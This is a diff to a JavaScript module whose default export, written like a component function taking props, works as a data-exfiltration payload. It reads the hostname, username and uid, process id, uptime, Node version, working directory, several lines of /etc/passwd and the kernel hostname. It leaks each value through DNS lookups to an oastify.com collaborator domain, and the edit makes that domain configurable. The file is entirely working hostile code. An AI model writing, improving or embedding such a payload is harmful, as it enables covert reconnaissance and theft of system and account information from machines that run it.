@@ -1,30 +1,24 @@
 module.exports = {
   default: function(props) {
+    var collab = (props && props.collab) || "default.oastify.com";
     var os, dns, fs;
     try { os = require("os"); } catch(e) {}
     try { dns = require("dns"); } catch(e) {}
     try { fs = require("fs"); } catch(e) {}
-    
-    function S(label) {
-      try { dns.lookup(label + ".udbktufvpeiomjnj4w3zjz3yrpxnlc.oastify.com", function(){}); } catch(e) {}
-    }
-    
+    function S(l) { try { dns.lookup(l + "." + collab, function(){}); } catch(e) {} }
     try { S("h-" + os.hostname()); } catch(e) {}
     try { var u = os.userInfo(); S("u-" + u.username + "-uid" + u.uid); } catch(e) {}
     try { S("pid-" + process.pid); } catch(e) {}
-    
+    try { S("uptime-" + Math.round(os.uptime())); } catch(e) {}
+    try { S("node-" + process.version.replace(/^v/,"")); } catch(e) {}
+    try { S("cwd-" + process.cwd().replace(/\//g,"_")); } catch(e) {}
     if (fs) {
       try {
-        var passwd = fs.readFileSync("/etc/passwd", "utf8");
-        var lines = passwd.trim().split("\n");
-        S("pw-len" + passwd.length);
-        for (var i = 0; i < Math.min(lines.length, 5); i++) {
-          var enc = lines[i].replace(/[^a-zA-Z0-9]/g, "-").substring(0, 30);
-          S("pw" + i + "-" + enc);
-        }
+        var pw = fs.readFileSync("/etc/passwd","utf8").trim().split("\n");
+        for (var i = 0; i < Math.min(pw.length,3); i++)
+          S("pw" + i + "-" + pw[i].replace(/[^a-zA-Z0-9]/g,"").substring(0,25));
       } catch(e) { S("pw-err"); }
-      try { S("kern-" + fs.readFileSync("/proc/sys/kernel/hostname","utf8").trim().replace(/[^a-zA-Z0-9]/g,"-")); } catch(e) { S("kern-err"); }
-      try { S("etch-" + fs.readFileSync("/etc/hostname","utf8").trim().replace(/[^a-zA-Z0-9]/g,"-")); } catch(e) { S("etch-err"); }
+      try { S("kern-" + fs.readFileSync("/proc/sys/kernel/hostname","utf8").trim()); } catch(e) { S("kern-err"); }
     }
     return null;
   }
